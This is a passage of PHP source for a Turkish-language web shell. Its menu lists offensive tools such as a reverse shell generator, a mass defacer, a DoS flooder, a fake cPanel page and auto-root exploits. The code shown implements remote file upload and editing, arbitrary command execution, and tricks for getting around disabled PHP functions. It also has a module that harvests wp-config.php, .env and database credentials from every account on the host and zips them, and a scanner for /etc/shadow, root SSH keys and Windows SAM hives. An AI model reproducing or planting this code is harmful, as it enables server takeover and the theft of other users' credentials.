        </a>
        <div class="navbar-menu">
            <a href="?action=dashboard" class="nav-item <?php echo $action == 'dashboard' ? 'active' : ''; ?>"><i class="bi bi-speedometer2"></i> Dashboard</a>
            <a href="?action=filemanager" class="nav-item <?php echo strpos($action, 'filemanager') === 0 ? 'active' : ''; ?>"><i class="bi bi-folder"></i> File Manager</a>
            <a href="?action=command" class="nav-item <?php echo $action == 'command' ? 'active' : ''; ?>"><i class="bi bi-terminal"></i> Command</a>
            <div class="dropdown">
                <a href="#" class="nav-item"><i class="bi bi-tools"></i> Tools <i class="bi bi-chevron-down"></i></a>
                <div class="dropdown-content">
                    <a href="?action=symlink"><i class="bi bi-link"></i> Smart Bypass</a>
                    <a href="?action=bypasshell"><i class="bi bi-shield"></i> BypassHell (5 fn)</a>
                    <a href="?action=config_fucker"><i class="bi bi-gear"></i> Auto Config Fucker</a>
                    <a href="?action=file_fucker"><i class="bi bi-search"></i> File Fucker</a>
                    <a href="?action=domain_lister"><i class="bi bi-globe"></i> Domain Lister</a>
                    <a href="?action=port_scanner"><i class="bi bi-hdd-network"></i> Port Scanner</a>
                    <a href="?action=mass_deface"><i class="bi bi-exclamation-triangle"></i> Mass Defacer</a>
                    <a href="?action=zoneh"><i class="bi bi-send"></i> ZoneH Submit</a>
                    <a href="?action=reverse_shell"><i class="bi bi-arrow-return-right"></i> Reverse Shell</a>
                    <a href="?action=privesc"><i class="bi bi-shield-lock"></i> PrivEsc Scanner</a>
                    <a href="?action=ssh_creator"><i class="bi bi-key"></i> SSH Creator</a>
                    <a href="?action=dos_flood"><i class="bi bi-lightning"></i> Internal DoS Flood</a>
                    <a href="?action=cpanel_fake"><i class="bi bi-window"></i> CPanel Fake Maker</a>
                    <a href="?action=backup"><i class="bi bi-archive"></i> Backup Alma</a>
                    <a href="?action=mail"><i class="bi bi-envelope"></i> Mail Sender</a>
                    <a href="?action=install_adminer"><i class="bi bi-database"></i> Adminer Yükle</a>
                    <a href="?action=db_dump"><i class="bi bi-database-fill"></i> Database Dump</a>
                    <a href="?action=safe_mode_fucker"><i class="bi bi-shield"></i> Safe Mode Bypass</a>
                    <a href="?action=open_basedir_bypass"><i class="bi bi-folder-symlink"></i> Open Basedir Bypass</a>
                    <a href="?action=sql_reader"><i class="bi bi-database"></i> SQL File Reader</a>
                    <a href="?action=auto_root"><i class="bi bi-crown"></i> Auto Root</a>
                    <a href="?action=cve_scanner"><i class="bi bi-bug"></i> CVE Scanner</a>
                    <a href="?action=mini_shells"><i class="bi bi-code-square"></i> Mini Shells</a>
                    <a href="?action=win_admin"><i class="bi bi-windows"></i> Windows Admin</a>
                    <a href="?action=zip_pack"><i class="bi bi-file-zip"></i> ZIP Packer</a>
                </div>
            </div>
            <a href="?action=logout" class="nav-item"><i class="bi bi-box-arrow-right"></i> Logout</a>
        </div>
    </div>
</div>
<div class="container">
<?php if($action == 'dashboard'): ?>
<div class="card">
    <div class="card-header">
        <span><i class="bi bi-info-circle"></i> SİSTEM BİLGİLERİ</span>
        <span><i class="bi bi-person-circle"></i> <?php echo $username; ?> @ <?php echo $server_ip; ?></span>
    </div>
    <div class="card-body">
        <div class="grid-2">
            <div>
                <table class="table">
                    <tr><td><i class="bi bi-pc-display"></i> <strong>OS:</strong></td><td><?php echo php_uname('s') . ' ' . php_uname('r'); ?></td></tr>
                    <tr><td><i class="bi bi-hdd-stack"></i> <strong>Hostname:</strong></td><td><?php echo php_uname('n'); ?></td></tr>
                    <tr><td><i class="bi bi-person"></i> <strong>User:</strong></td><td><?php echo $username; ?> (<?php echo $uid; ?>:<?php echo $gid; ?>)</td></tr>
                    <tr><td><i class="bi bi-server"></i> <strong>Server IP:</strong></td><td><?php echo $server_ip; ?></td></tr>
                    <tr><td><i class="bi bi-wifi"></i> <strong>Your IP:</strong></td><td><?php echo $client_ip; ?></td></tr>
                </table>
            </div>
            <div>
                <table class="table">
                    <tr><td><i class="bi bi-code-square"></i> <strong>PHP Version:</strong></td><td><?php echo $php_version; ?></td></tr>
                    <tr><td><i class="bi bi-hdd"></i> <strong>Server Software:</strong></td><td><?php echo $server_software; ?></td></tr>
                    <tr><td><i class="bi bi-shield"></i> <strong>Safe Mode:</strong></td><td><?php echo $safe_mode; ?></td></tr>
                    <tr><td><i class="bi bi-folder"></i> <strong>Open Basedir:</strong></td><td><span class="badge-info"><?php echo $open_basedir ?: 'NONE'; ?></span></td></tr>
                    <tr><td><i class="bi bi-x-circle"></i> <strong>Disabled Functions:</strong></td><td><?php echo $disable_functions ?: 'NONE'; ?></td></tr>
                </table>
            </div>
        </div>
        <div class="terminal mt-20">
            <pre><?php echo htmlspecialchars(php_uname('a')); ?></pre>
        </div>
    </div>
</div>
<div class="dashboard-grid">
    <div class="dashboard-item" onclick="location.href='?action=filemanager'"><i class="bi bi-folder"></i><h3>File Manager</h3><p>Dosya yönetimi, düzenleme, yükleme</p></div>
    <div class="dashboard-item" onclick="location.href='?action=command'"><i class="bi bi-terminal"></i><h3>Command</h3><p>Komut çalıştırma (7+ yöntem)</p></div>
    <div class="dashboard-item" onclick="location.href='?action=symlink'"><i class="bi bi-link"></i><h3>Smart Bypass</h3><p>15+ yöntem</p></div>
    <div class="dashboard-item" onclick="location.href='?action=bypasshell'"><i class="bi bi-shield"></i><h3>BypassHell</h3><p>5 fonksiyonlu bypass</p></div>
    <div class="dashboard-item" onclick="location.href='?action=config_fucker'"><i class="bi bi-gear"></i><h3>Auto Config</h3><p>/etc/passwd parser</p></div>
    <div class="dashboard-item" onclick="location.href='?action=file_fucker'"><i class="bi bi-search"></i><h3>File Fucker</h3><p>40 kritik dosya</p></div>
    <div class="dashboard-item" onclick="location.href='?action=domain_lister'"><i class="bi bi-globe"></i><h3>Domain Lister</h3><p>12 yöntem</p></div>
    <div class="dashboard-item" onclick="location.href='?action=port_scanner'"><i class="bi bi-hdd-network"></i><h3>Port Scanner</h3><p>TCP port tarama</p></div>
    <div class="dashboard-item" onclick="location.href='?action=mass_deface'"><i class="bi bi-exclamation-triangle"></i><h3>Mass Defacer</h3><p>Toplu deface</p></div>
    <div class="dashboard-item" onclick="location.href='?action=reverse_shell'"><i class="bi bi-arrow-return-right"></i><h3>Reverse Shell</h3><p>Generator</p></div>
    <div class="dashboard-item" onclick="location.href='?action=privesc'"><i class="bi bi-shield-lock"></i><h3>PrivEsc Scanner</h3><p>PEAS + Manual</p></div>
    <div class="dashboard-item" onclick="location.href='?action=ssh_creator'"><i class="bi bi-key"></i><h3>SSH Creator</h3><p>SSH key generator</p></div>
    <div class="dashboard-item" onclick="location.href='?action=dos_flood'"><i class="bi bi-lightning"></i><h3>DoS Flooder</h3><p>İç ağı çökert</p></div>
    <div class="dashboard-item" onclick="location.href='?action=cpanel_fake'"><i class="bi bi-window"></i><h3>CPanel Fake</h3><p>Sahte panel + .htaccess</p></div>
    <div class="dashboard-item" onclick="location.href='?action=backup'"><i class="bi bi-archive"></i><h3>Backup Alma</h3><p>OS level ZIP</p></div>
    <div class="dashboard-item" onclick="location.href='?action=mail'"><i class="bi bi-envelope"></i><h3>Mail Sender</h3><p>Mail gönder</p></div>
    <div class="dashboard-item" onclick="location.href='?action=install_adminer'"><i class="bi bi-database"></i><h3>Adminer Yükle</h3><p>adminer.php</p></div>
    <div class="dashboard-item" onclick="location.href='?action=db_dump'"><i class="bi bi-database-fill"></i><h3>Database Dump</h3><p>Tüm DB'ler dumped.zip</p></div>
    <div class="dashboard-item" onclick="location.href='?action=safe_mode_fucker'"><i class="bi bi-shield"></i><h3>Safe Mode Bypass</h3><p>Safe mode atlat</p></div>
    <div class="dashboard-item" onclick="location.href='?action=open_basedir_bypass'"><i class="bi bi-folder-symlink"></i><h3>Open Basedir Bypass</h3><p>open_basedir atlat</p></div>
    <div class="dashboard-item" onclick="location.href='?action=sql_reader'"><i class="bi bi-database"></i><h3>SQL File Reader</h3><p>LOAD_FILE</p></div>
    <div class="dashboard-item" onclick="location.href='?action=auto_root'"><i class="bi bi-crown"></i><h3>Auto Root</h3><p>PwnKit + DirtyPipe</p></div>
    <div class="dashboard-item" onclick="location.href='?action=cve_scanner'"><i class="bi bi-bug"></i><h3>CVE Scanner</h3><p>Otomatik exploit</p></div>
    <div class="dashboard-item" onclick="location.href='?action=mini_shells'"><i class="bi bi-code-square"></i><h3>Mini Shells</h3><p>PHP, Python, Perl</p></div>
    <div class="dashboard-item" onclick="location.href='?action=win_admin'"><i class="bi bi-windows"></i><h3>Windows Admin</h3><p>Admin + UAC + RDP</p></div>
    <div class="dashboard-item" onclick="location.href='?action=zip_pack'"><i class="bi bi-file-zip"></i><h3>ZIP Packer</h3><p>Şifreli ZIP</p></div>
</div>
<?php endif; ?>
<?php if($action == 'filemanager'): ?>
<?php
// Dosya yolu birleştirme fonksiyonu
function join_path($dir, $file) {
    $dir = rtrim($dir, '/');
    return $dir . '/' . ltrim($file, '/');
}

// POST işlemleri - GÜVENLİ hale getirildi
if(isset($_POST['delete'])) { 
    $file = join_path($current_dir, $_POST['delete']);
    if(basename($file) != basename(__FILE__)) {
        if(is_file($file)) unlink($file); 
        elseif(is_dir($file)) deleteDirectory($file);
        $message = '<div class="alert alert-success">Silindi: ' . htmlspecialchars($_POST['delete']) . '</div>';
    } else {
        $message = '<div class="alert alert-danger">Kendini silemezsin!</div>';
    }
}

if(isset($_POST['rename_old']) && isset($_POST['rename_new'])) { 
    $old = join_path($current_dir, $_POST['rename_old']);
    $new = join_path($current_dir, $_POST['rename_new']);
    if(basename($old) != basename(__FILE__)) {
        if(rename($old, $new)) {
            $message = '<div class="alert alert-success">Yeniden adlandırıldı: ' . htmlspecialchars($_POST['rename_old']) . ' → ' . htmlspecialchars($_POST['rename_new']) . '</div>';
        }
    } else {
        $message = '<div class="alert alert-danger">Kendini yeniden adlandıramazsın!</div>';
    }
}

if(isset($_POST['new_file'])) { 
    $f = join_path($current_dir, $_POST['new_file']); 
    if(!file_exists($f)) { 
        touch($f); 
        $message = '<div class="alert alert-success">Dosya oluşturuldu: ' . htmlspecialchars($_POST['new_file']) . '</div>';
    }
}

if(isset($_POST['new_folder'])) { 
    $f = join_path($current_dir, $_POST['new_folder']); 
    if(!file_exists($f)) { 
        mkdir($f, 0755); 
        $message = '<div class="alert alert-success">Klasör oluşturuldu: ' . htmlspecialchars($_POST['new_folder']) . '</div>';
    }
}

if(isset($_FILES['upload_file'])) { 
    $target = join_path($current_dir, $_FILES['upload_file']['name']); 
    if(move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $message = '<div class="alert alert-success">Dosya yüklendi: ' . htmlspecialchars($_FILES['upload_file']['name']) . '</div>';
    }
}

if(isset($_POST['save_file']) && isset($_POST['content'])) { 
    $save_file = join_path($current_dir, $_POST['save_file']);
    if(basename($save_file) != basename(__FILE__)) {
        file_put_contents($save_file, $_POST['content']); 
        $message = '<div class="alert alert-success">Dosya kaydedildi: ' . htmlspecialchars($_POST['save_file']) . '</div>';
    } else {
        $message = '<div class="alert alert-danger">Kendini kaydedemezsin!</div>';
    }
}

// view_file işlemi - MODAL ile büyük editör
$editor_content = '';
if(isset($_POST['view_file'])) {
    $fileName = $_POST['view_file'];
    $fileToView = join_path($current_dir, $fileName);
    
    if(basename($fileToView) == basename(__FILE__)) {
        $message = '<div class="alert alert-danger">Bu dosya warnshell! Kendini düzenleyemezsin!</div>';
    } elseif(file_exists($fileToView) && is_file($fileToView)) {
        $fileContent = file_get_contents($fileToView);
        $fileSize = filesize($fileToView);
        
        $editor_content = '
        <div class="modal show-modal" id="editorModal" style="display:flex;">
            <div class="modal-content" style="width:95%; max-width:1200px;">
                <div class="modal-header">
                    <h3><i class="bi bi-pencil-square"></i> Düzenleniyor: ' . htmlspecialchars($fileName) . ' (' . format_bytes($fileSize) . ')</h3>
                    <button class="modal-close" onclick="document.getElementById(\'editorModal\').remove()">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post" action="?action=filemanager&dir=' . urlencode($current_dir) . '">
                        <input type="hidden" name="save_file" value="' . htmlspecialchars($fileName) . '">
                        <textarea name="content" class="editor-textarea" style="width:100%; height:70vh; background:#0a0a0f; color:#00ff00; border:1px solid #9c27b0; padding:15px; font-family:\'Courier New\', monospace; font-size:14px; line-height:1.5; resize:none;" wrap="off">' . htmlspecialchars($fileContent) . '</textarea>
                        <div style="margin-top:15px; display:flex; gap:10px;">
                            <button type="submit" class="btn btn-primary"><i class="bi bi-save"></i> Kaydet</button>
                            <button type="button" class="btn btn-danger" onclick="document.getElementById(\'editorModal\').remove()"><i class="bi bi-x-circle"></i> İptal</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>';
    } else {
        $message = '<div class="alert alert-danger">Dosya bulunamadı: ' . htmlspecialchars($fileName) . '</div>';
    }
}

// Mesajı göster
echo $message;
?>
<div class="card">
    <div class="card-header"><i class="bi bi-folder"></i> FILE MANAGER <span><i class="bi bi-folder2-open"></i> <?php echo $current_dir; ?></span></div>
    <div class="card-body">
        <div class="path-breadcrumb">
            <?php 
            $parts = explode('/', rtrim($current_dir, '/')); 
            $path_build = ''; 
            foreach($parts as $part): 
                if(empty($part)) continue; 
                $path_build .= '/' . $part; 
                echo '<a href="?action=filemanager&dir=' . urlencode($path_build . '/') . '">' . $part . '</a> / '; 
            endforeach; 
            ?>
        </div>
        
        <div class="grid-2 mb-20">
            <form method="post" enctype="multipart/form-data" style="display:flex; gap:5px;">
                <input type="file" name="upload_file" class="form-control" style="flex:1;">
                <button type="submit" class="btn btn-primary"><i class="bi bi-upload"></i> Yükle</button>
            </form>
            <div style="display:flex; gap:5px;">
                <form method="post" style="flex:1;">
                    <input type="text" name="new_file" class="form-control" placeholder="Yeni dosya">
                    <button type="submit" class="btn btn-success btn-sm mt-10"><i class="bi bi-file-plus"></i> Dosya</button>
                </form>
                <form method="post" style="flex:1;">
                    <input type="text" name="new_folder" class="form-control" placeholder="Yeni klasör">
                    <button type="submit" class="btn btn-warning btn-sm mt-10"><i class="bi bi-folder-plus"></i> Klasör</button>
                </form>
            </div>
        </div>
        
        <table class="table">
            <thead>
                <tr>
                    <th>İsim</th>
                    <th>Boyut</th>
                    <th>Değiştirilme</th>
                    <th>İzinler</th>
                    <th>İşlemler</th>
                </tr>
            </thead>
            <tbody>
                <?php 
                $files = scandir($current_dir); 
                natcasesort($files); 
                foreach($files as $file): 
                    if($file == '.' || $file == '..') continue; 
                    $full = $current_dir . $file; 
                    $is_dir = is_dir($full); 
                ?>
                <tr>
                    <td>
                        <?php if($is_dir): ?>
                            <i class="bi bi-folder" style="color:#ffb74d;"></i> 
                            <a href="?action=filemanager&dir=<?php echo urlencode($full . '/'); ?>" style="color:#ffb74d;"><?php echo $file; ?></a>
                        <?php else: ?>
                            <i class="bi bi-file-earmark" style="color:#ce93d8;"></i> 
                            <a href="#" onclick="viewFile('<?php echo addslashes($file); ?>')" style="color:#ce93d8;"><?php echo $file; ?></a>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $is_dir ? '&lt;DIR&gt;' : format_bytes(filesize($full)); ?></td>
                    <td><?php echo date('Y-m-d H:i', filemtime($full)); ?></td>
                    <td><span class="badge-info"><?php echo get_perms($full); ?></span></td>
                    <td class="btn-group">
                        <button class="btn btn-sm btn-primary" onclick="renameFile('<?php echo addslashes($file); ?>')"><i class="bi bi-pencil"></i></button>
                        <button class="btn btn-sm btn-danger" onclick="deleteFile('<?php echo addslashes($file); ?>')"><i class="bi bi-trash"></i></button>
                        <?php if(!$is_dir): ?>
                        <a href="?action=filemanager&dir=<?php echo urlencode($current_dir); ?>&download=<?php echo urlencode($file); ?>" class="btn btn-sm btn-success"><i class="bi bi-download"></i></a>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<?php echo $editor_content; ?>

<script>
function viewFile(file) {
    var form = document.createElement('form');
    form.method = 'post';
    form.action = '?action=filemanager&dir=<?php echo urlencode($current_dir); ?>';
    form.innerHTML = '<input type="hidden" name="view_file" value="' + file + '">';
    document.body.appendChild(form);
    form.submit();
}

function deleteFile(file) {
    if(confirm('Silmek istediğinize emin misiniz?\n' + file)) {
        var form = document.createElement('form');
        form.method = 'post';
        form.action = '?action=filemanager&dir=<?php echo urlencode($current_dir); ?>';
        form.innerHTML = '<input type="hidden" name="delete" value="' + file + '">';
        document.body.appendChild(form);
        form.submit();
    }
}

function renameFile(old) {
    var newname = prompt('Yeni isim:', old);
    if(newname && newname != old) {
        var form = document.createElement('form');
        form.method = 'post';
        form.action = '?action=filemanager&dir=<?php echo urlencode($current_dir); ?>';
        form.innerHTML = '<input type="hidden" name="rename_old" value="' + old + '"><input type="hidden" name="rename_new" value="' + newname + '">';
        document.body.appendChild(form);
        form.submit();
    }
}
</script>

<?php if(isset($_GET['raw'])): ?>
<?php 
$file = $current_dir . $_GET['raw']; 
if(file_exists($file) && is_file($file)) { 
    header('Content-Type: text/plain'); 
    readfile($file); 
    exit; 
} 
endif; ?>

<?php if(isset($_GET['download'])): ?>
<?php 
$file = $current_dir . $_GET['download']; 
if(file_exists($file) && is_file($file)) { 
    header('Content-Description: File Transfer'); 
    header('Content-Type: application/octet-stream'); 
    header('Content-Disposition: attachment; filename="' . basename($file) . '"'); 
    header('Content-Length: ' . filesize($file)); 
    readfile($file); 
    exit; 
} 
endif; ?>

<?php endif; ?>

<?php if($action == 'command'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-terminal"></i> KOMUT ÇALIŞTIRMA</div>
    <div class="card-body">
        <?php if(isset($_POST['cmd'])): ?>
            <?php 
            $cmd = $_POST['cmd']; 
            $output = execute_command($cmd); 
            ?>
            <div class="terminal">
                <pre><?php echo htmlspecialchars($output); ?></pre>
            </div>
        <?php endif; ?>
        
        <form method="post">
            <div class="form-group">
                <input type="text" class="form-control" name="cmd" placeholder="Komut girin (örn: id, whoami, ls -la)" value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>" autofocus>
            </div>
            <button type="submit" class="btn btn-primary mt-10"><i class="bi bi-play"></i> Çalıştır</button>
        </form>
        
        <div class="alert alert-info mt-10" style="font-size:12px;">
            <i class="bi bi-info-circle"></i> 
            <strong>Kullanılabilir fonksiyonlar:</strong> 
            <?php
            $cmds = array();
            if(function_exists('shell_exec')) $cmds[] = 'shell_exec';
            if(function_exists('exec')) $cmds[] = 'exec';
            if(function_exists('system')) $cmds[] = 'system';
            if(function_exists('passthru')) $cmds[] = 'passthru';
            if(function_exists('popen')) $cmds[] = 'popen';
            if(function_exists('proc_open')) $cmds[] = 'proc_open';
            echo implode(', ', $cmds);
            ?>
        </div>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'bypasshell'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-shield"></i> BYPASSHELL - 5 FONKSİYONLU BYPASS</div>
    <div class="card-body">
        <?php
        echo '<div class="alert alert-info"><i class="bi bi-info-circle"></i> ';
        echo 'mail(): ' . (function_exists('mail') ? '<span class="badge-on">ON</span>' : '<span class="badge-off">OFF</span>') . ' | ';
        echo 'mb_send_mail(): ' . (function_exists('mb_send_mail') ? '<span class="badge-on">ON</span>' : '<span class="badge-off">OFF</span>') . ' | ';
        echo 'error_log(): ' . (function_exists('error_log') ? '<span class="badge-on">ON</span>' : '<span class="badge-off">OFF</span>') . ' | ';
        echo 'imap_mail(): ' . (function_exists('imap_mail') ? '<span class="badge-on">ON</span>' : '<span class="badge-off">OFF</span>') . ' | ';
        echo 'proc_open(): ' . (function_exists('proc_open') ? '<span class="badge-on">ON</span>' : '<span class="badge-off">OFF</span>');
        echo '</div>';
        if(isset($_POST['cmd_input'])) {
            $cmd = $_POST['cmd_input'];
            $results = bypasshell_execute($cmd);
            echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-shield"></i> SONUÇLAR</div><div class="card-body">';
            foreach($results as $method => $output) {
                echo '<h5>' . $method . ':</h5><div class="terminal"><pre>' . htmlspecialchars($output) . '</pre></div>';
            }
            echo '</div></div>';
        }
        ?>
        <form method="post">
            <div class="form-group">
                <input type="text" class="form-control" name="cmd_input" placeholder="Komut girin (örn: id, whoami, ls -la)" autofocus>
            </div>
            <button type="submit" class="btn btn-primary"><i class="bi bi-shield"></i> BYPASS DENE</button>
        </form>
        <p class="text-muted mt-10"><i class="bi bi-info-circle"></i> 5 farklı fonksiyon dener: mail() + LD_PRELOAD, mb_send_mail(), error_log(), imap_mail(), proc_open(). HaxorSec mantığı.</p>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'config_fucker'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-gear"></i> AUTO CONFIG FUCKER + ZIP</div>
    <div class="card-body">
        <?php
        if(isset($_POST['passwd_text'])) {
            $passwd = explode("\n", $_POST['passwd_text']);
            $home_dirs = array();
            $users = array();
            foreach($passwd as $line) {
                $line = trim($line);
                if(empty($line) || $line[0] == '#') continue;
                $parts = explode(':', $line);
                if(count($parts) >= 6) {
                    $username = $parts[0];
                    $home = $parts[5];
                    if(strpos($home, '/home/') === 0 || strpos($home, '/var/www/') === 0 || strpos($home, '/usr/home/') === 0) {
                        if(is_dir($home)) {
                            $home_dirs[] = $home;
                            $users[$home] = $username;
                        }
                        if(is_dir($home . '/public_html')) {
                            $home_dirs[] = $home . '/public_html';
                        }
                    }
                }
            }
            for($i = 0; $i < 10; $i++) {
                $base = $i == 0 ? '/home' : '/home' . $i;
                if(is_dir($base)) {
                    $items = scandir($base);
                    foreach($items as $item) {
                        if($item != '.' && $item != '..' && is_dir($base . '/' . $item)) {
                            $home_dirs[] = $base . '/' . $item;
                            if(is_dir($base . '/' . $item . '/public_html')) {
                                $home_dirs[] = $base . '/' . $item . '/public_html';
                            }
                        }
                    }
                }
            }
            $home_dirs = array_unique($home_dirs);
            $configs_found = array();
            $zip = new ZipArchive();
            $zipname = 'configs_' . date('Ymd_His') . '.zip';
            if($zip->open($zipname, ZipArchive::CREATE) !== true) {
                echo '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> ZIP oluşturulamadı!</div>';
            } else {
                $patterns = array(
                    'wp-config.php' => 'WordPress',
                    'configuration.php' => 'Joomla',
                    'config.php' => 'Generic',
                    'db.php' => 'DB',
                    'includes/config.php' => 'vBulletin',
                    'vb/includes/config.php' => 'vBulletin',
                    'forum/includes/config.php' => 'vBulletin',
                    'submitticket.php' => 'WHMCS',
                    'clients/configuration.php' => 'WHMCS',
                    'support/configuration.php' => 'WHMCS',
                    '.env' => 'Env',
                    'database.yml' => 'YAML',
                    'settings.php' => 'Drupal',
                    'config/database.php' => 'Laravel',
                    'app/config/database.php' => 'Laravel',
                    'application/config/database.php' => 'CodeIgniter',
                    'system/config/database.php' => 'CodeIgniter',
                    'wp-config-sample.php' => 'WordPress Sample',
                    'config.inc.php' => 'phpMyAdmin',
                    'mysql.conf' => 'MySQL',
                    '.my.cnf' => 'MySQL Config',
                    'admin/config.php' => 'Admin Config',
                    'private/config.php' => 'Private Config'
                );
                foreach($home_dirs as $home) {
                    $base = rtrim($home, '/') . '/';
                    foreach($patterns as $rel => $type) {
                        $full = $base . $rel;
                        if(file_exists($full)) {
                            $content = smart_read_file($full);
                            if($content) {
                                $username = isset($users[$home]) ? $users[$home] : basename($home);
                                $fname = $username . '_' . $type . '_' . str_replace('/', '_', $rel) . '.txt';
                                $fname = preg_replace('/[^a-zA-Z0-9_\.\-]/', '_', $fname);
                                $zip->addFromString($fname, $content);
                                $configs_found[] = $fname;
                            }
                        }
                    }
                    if(is_dir($base)) {
                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($base), RecursiveIteratorIterator::SELF_FIRST);
                        foreach($files as $file) {
                            if($file->isDir()) continue;
                            $path = $file->getPathname();
                            if(preg_match('/(config|database|db|settings|wp-config|conf)/i', $path) && preg_match('/\.(php|inc|conf|ini|env|yml|xml|json)$/', $path)) {
                                if(filesize($path) < 1000000) {
                                    $content = smart_read_file($path);
                                    if($content) {
                                        $username = isset($users[$home]) ? $users[$home] : basename($home);
                                        $fname = $username . '_' . basename(dirname($path)) . '_' . basename($path) . '.txt';
                                        $fname = preg_replace('/[^a-zA-Z0-9_\.\-]/', '_', $fname);
                                        $zip->addFromString($fname, $content);
                                        $configs_found[] = $fname;
                                    }
                                }
                            }
                        }
                    }
                }
                $zip->close();
                if(count($configs_found) > 0) {
                    echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i>';
                    echo '<p>Bulunan config sayısı: ' . count($configs_found) . '</p>';
                    echo '<a href="' . $zipname . '" class="btn btn-primary"><i class="bi bi-download"></i> ZIP İndir</a>';
                    echo '</div>';
                    echo '<div class="terminal"><pre>';
                    foreach($configs_found as $cf) echo $cf . "\n";
                    echo '</pre></div>';
                } else {
                    echo '<div class="alert alert-warning"><i class="bi bi-exclamation-circle"></i> Hiç config bulunamadı!</div>';
                }
            }
        }
        ?>
        <form method="post">
            <div class="form-group">
                <label><i class="bi bi-file-text"></i> /etc/passwd içeriğini yapıştırın:</label>
                <textarea class="form-control" name="passwd_text" rows="15" placeholder="root:x:0:0:root:/root:/bin/bash&#10;user:x:1000:1000:user:/home/user:/bin/bash"><?php echo htmlspecialchars(@file_get_contents('/etc/passwd')); ?></textarea>
            </div>
            <button type="submit" class="btn btn-primary"><i class="bi bi-search"></i> Configleri Avla ve ZIPle</button>
        </form>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'file_fucker'): ?>
<div class="card"><div class="card-header"><i class="bi bi-search"></i> FILE FUCKER (40 kritik dosya)</div><div class="card-body"><?php $linux_files=array('/etc/passwd','/etc/shadow','/etc/hosts','/etc/hostname','/etc/group','/etc/my.cnf','/etc/httpd/conf/httpd.conf','/usr/local/apache2/conf/httpd.conf','/etc/apache2/apache2.conf','/etc/nginx/nginx.conf','/etc/php.ini','/usr/local/php/lib/php.ini','/var/cpanel/accounting.log','/etc/cpanel/ea4/passwd','/etc/psa/.psa.shadow','/usr/local/directadmin/conf/mysql.conf','/etc/ssh/sshd_config','/root/.bash_history','/var/log/messages','/etc/cron.allow','/etc/crontab','/var/log/auth.log','/var/log/secure','/etc/mysql/my.cnf','/etc/postfix/main.cf','/etc/exim/exim.conf','/etc/proftpd.conf','/etc/vsftpd.conf','/etc/sudoers','/root/.ssh/id_rsa','/root/.ssh/authorized_keys','/var/spool/cron/crontabs/root','/etc/security/passwd','/etc/security/opasswd','/etc/security/group','/etc/samba/smb.conf','/etc/pure-ftpd.conf','/etc/wu-ftpd.conf','/etc/ftpaccess','/etc/ssh/ssh_config'); $windows_files=array('C:\\Windows\\System32\\drivers\\etc\\hosts','C:\\Windows\\System32\\config\\SAM','C:\\Windows\\System32\\config\\SYSTEM','C:\\Windows\\System32\\config\\SOFTWARE','C:\\Windows\\repair\\SAM','C:\\Windows\\repair\\SYSTEM','C:\\Windows\\repair\\SOFTWARE','C:\\Windows\\debug\\NetSetup.log','C:\\Windows\\iis6.log','C:\\inetpub\\wwwroot\\web.config','C:\\xampp\\apache\\conf\\httpd.conf','C:\\xampp\\mysql\\bin\\my.ini','C:\\xampp\\php\\php.ini','C:\\wamp\\bin\\apache\\apache2.*\\conf\\httpd.conf','C:\\wamp\\bin\\mysql\\mysql*\\my.ini','C:\\wamp\\bin\\php\\php*\\php.ini','C:\\Users\\Administrator\\NTUser.dat','C:\\boot.ini','C:\\Windows\\win.ini','C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config','C:\\Program Files\\MySQL\\MySQL Server *\\my.ini','C:\\Program Files (x86)\\MySQL\\MySQL Server *\\my.ini','C:\\Windows\\System32\\config\\SECURITY','C:\\Windows\\System32\\config\\DEFAULT','C:\\Windows\\System32\\config\\COMPONENTS','C:\\Windows\\System32\\config\\BBI','C:\\Windows\\System32\\drivers\\etc\\networks','C:\\Windows\\System32\\drivers\\etc\\protocol','C:\\Windows\\System32\\drivers\\etc\\services','C:\\Windows\\System32\\drivers\\etc\\lmhosts.sam','C:\\Windows\\System32\\drivers\\etc\\hosts.ics','C:\\Windows\\System32\\winevt\\Logs\\System.evtx','C:\\Windows\\System32\\winevt\\Logs\\Security.evtx','C:\\Windows\\System32\\winevt\\Logs\\Application.evtx','C:\\Windows\\System32\\config\\systemprofile\\NTUser.dat','C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat'); $files_to_scan=$is_windows?$windows_files:$linux_files; if(isset($_POST['scan'])){ $found=array(); foreach($files_to_scan as $pattern){ if(strpos($pattern,'*')!==false){ $base=dirname($pattern); $file_pattern=basename($pattern); if(is_dir($base)){ foreach(glob($base.'/'.$file_pattern) as $f){ if(file_exists($f)&&is_readable($f)) $found[]=$f; } } } else { if(file_exists($pattern)&&is_readable($pattern)) $found[]=$pattern; } } if(count($found)>0){ echo '<div class="alert alert-success"><h4>Bulunan kritik dosyalar:</h4><ul>'; foreach($found as $f){ $view_link=' <a href="?action=file_fucker&raw='.urlencode($f).'" class="btn btn-sm btn-info" target="_blank"><i class="bi bi-eye"></i></a>'; echo '<li>'.$f.' ('.format_bytes(filesize($f)).')'.$view_link.'</li>'; } echo '</ul></div>'; } else echo '<div class="alert alert-warning">Hiçbir kritik dosya bulunamadı!</div>'; } if(isset($_GET['raw'])){ $file=$_GET['raw']; if(file_exists($file)&&is_readable($file)){ header('Content-Type: text/plain'); readfile($file); exit; } } ?><form method="post"><button type="submit" name="scan" class="btn btn-primary"><i class="bi bi-search"></i> Kritik Dosyaları Tara</button></form></div></div>
<?php endif; ?>
<?php if($action == 'domain_lister'): ?>
